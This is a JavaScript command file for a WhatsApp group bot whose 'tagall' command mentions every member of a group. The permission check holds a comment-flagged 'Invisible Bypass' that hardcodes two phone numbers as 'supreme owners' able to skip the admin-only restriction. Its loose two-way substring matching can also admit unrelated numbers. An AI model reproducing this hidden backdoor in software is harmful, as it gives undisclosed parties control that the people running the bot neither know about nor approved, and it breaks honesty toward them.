/**
 * Tag All Command - Mention all group members
 * GhostG-X Edition
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const config = require('../../config.js');

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

const prefix = config.prefix || '.';

module.exports = {
  name: 'tagall',
  aliases: ['mentionall', 'everyone', 'all'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ɪɴᴠᴏǫᴜᴇ ᴛᴏᴜs ʟᴇs ᴍᴇᴍʙʀᴇs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  usage: `${prefix}tagall <message>`,
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,

  async execute(sock, msg, args, extra) {
    const { reply } = extra;

    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
      const supremeOwners = ['22651622652', '22665108174'];
      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
      if (!extra.isAdmin && !isMe) {
        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const message = args.join(' ') || 'ᴀᴘᴘᴇʟ ᴀᴜx ᴍᴇᴍʙʀᴇs !';
      const participants = extra.groupMetadata.participants.map(p => p.id);

      // Fonction pour ajouter un zéro devant les chiffres < 10
      const padZero = (num) => (num < 10 ? `0${num}` : num);

      let text = `*╭╼━━━≪• ᴀɴɴᴏɴᴄᴇ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ •≫━━━╾╮*\n` +
                 `*┃* 📢 *${toSmallCaps('message')} :*\n` +
                 `*┃* > ${message}\n\n` +
                 `*┃* 👥 *${toSmallCaps('invocation des membres')} :*\n`;

      participants.forEach((participant, index) => {
        text += `*┃* [${padZero(index + 1)}] ➻ @${participant.split('@')[0]}\n`;
      });

      text += `\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;

      await sock.sendMessage(extra.from, {
        text,
        mentions: participants
      }, { quoted: msg });

    } catch (error) {
      console.error('TagAll Command Error:', error);
      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
    }
  }
};
